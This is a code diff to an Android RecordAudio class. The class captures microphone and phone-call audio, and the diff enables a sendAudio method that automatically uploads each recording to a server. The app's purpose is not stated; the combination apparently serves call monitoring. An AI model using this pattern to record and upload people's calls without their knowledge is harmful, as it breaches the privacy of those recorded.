@@ -6,9 +6,12 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Environment;
 
+import com.inet.android.request.ConstantValue;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
@@ -33,13 +36,15 @@ public final class RecordAudio {
 	private final int MINUTE = 60;
 	private int source = 0;
 	private int minute = -1;
-	
-	public RecordAudio(int minute,  int source) {
+	private Context mContext;
+
+	public RecordAudio(int minute, int source, Context context) {
 		Logging.doLog(LOG_TAG, " RecordAudio", " RecordAudio");
 		mThreadPool = Executors.newCachedThreadPool();
+		this.mContext = context;
 		this.minute = minute * MINUTE;
 		this.source = source;
-		}
+	}
 
 	// --------create Record and start recording---------------
 	private void createRecord(int source, String fileName) {
@@ -47,33 +52,38 @@ public final class RecordAudio {
 		// initialise MediaRecorder
 		if (mMediaRecorder == null) {
 			mMediaRecorder = new MediaRecorder();
-				switch (source) {
+			switch (source) {
 			case 1:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);		
+				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 				break;
 			case 2:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
 				break;
 			case 3:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
 				break;
 			case 4:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
 				break;
 			case 5:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
 				break;
 			case 6:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
 				break;
 			default:
-				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);		
+				mMediaRecorder
+						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
 				break;
 			}
-				
-			mMediaRecorder
-					.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+
+			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
 			mMediaRecorder.setAudioEncodingBitRate(16);
 			mMediaRecorder.setAudioSamplingRate(44100);
 
@@ -87,8 +97,8 @@ public final class RecordAudio {
 		try {
 			mMediaRecorder.prepare();
 			mMediaRecorder.start();
-			Logging.doLog(LOG_TAG,
-					"mMediaRecorder.start()", "mMediaRecorder.start()");
+			Logging.doLog(LOG_TAG, "mMediaRecorder.start()",
+					"mMediaRecorder.start()");
 		} catch (IllegalStateException e) {
 			Logging.doLog(LOG_TAG,
 					"IllegalStateException thrown while trying to record a greeting");
@@ -128,9 +138,11 @@ public final class RecordAudio {
 			}
 		});
 	}
-	public void executeStopAfterCallRecordng(){
+
+	public void executeStopAfterCallRecordng() {
 		mThreadPool.execute(new RecordingCounterUpdater());
 	}
+
 	// --------stop recording and call sendAudio----------------
 	public void executeStopRecording() {
 		mThreadPool.execute(new Runnable() {
@@ -139,8 +151,8 @@ public final class RecordAudio {
 				if (mMediaRecorder != null) {
 					stopRecording();
 					mIsRecording.set(false);
-//					if (outputFileName != null)
-//						sendAudio(outputFileName);
+					if (outputFileName != null)
+						sendAudio(outputFileName);
 					outputFileName = null;
 				}
 
@@ -222,13 +234,13 @@ public final class RecordAudio {
 		}
 	}
 
-//	private void sendAudio(String path) {
-//		Logging.doLog(LOG_TAG, "sendAudio", "sendAudio");
-//		// if (!RequestList.getLastFile().equals(path)) {
-//		RequestList.setLastFile(path);
-//		RequestList.sendFileRequest(ConstantRequest.TYPE_AUDIO_REQUEST, path, mContext);
-//		// }
-//	}
+	private void sendAudio(String path) {
+		Logging.doLog(LOG_TAG, "sendAudio", "sendAudio");
+		if (!RequestList.getLastFile().equals(path)) {
+			RequestList.sendFileRequest(ConstantValue.TYPE_AUDIO_REQUEST, path,
+					mContext);
+		}
+	}
 
 	/**
 	 * Listener for the MediaRecorder error messages.
